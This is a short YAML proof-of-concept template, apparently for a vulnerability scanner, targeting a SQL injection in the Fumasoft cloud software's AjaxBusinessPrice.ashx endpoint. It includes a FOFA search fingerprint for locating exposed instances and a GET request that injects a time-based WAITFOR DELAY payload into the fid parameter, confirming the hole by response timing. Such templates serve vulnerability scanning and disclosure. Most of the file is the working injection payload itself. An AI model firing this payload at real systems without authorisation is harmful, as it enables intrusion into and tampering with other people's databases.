id: poc-yaml-fumasoft-ajaxbusinessprice-ashx-sqli
info:
  name: 孚盟云 AjaxBusinessPrice.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 孚盟云
  fofa: app="孚盟软件-孚盟云"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /m/Dingding/Ajax
  expression: contains(body,"文档已移动") && contains(body,"/m/Dingding/Ajax/")
- method: GET
  path: /m/Dingding/Ajax/AjaxBusinessPrice.ashx?action=GetBmailByFid&fid=-1';WAITFOR+DELAY+'0:0:{{.t1}}'--
  expression: status_code == 200 && body == "-1" && duration > t1 && duration < t2
transport: http
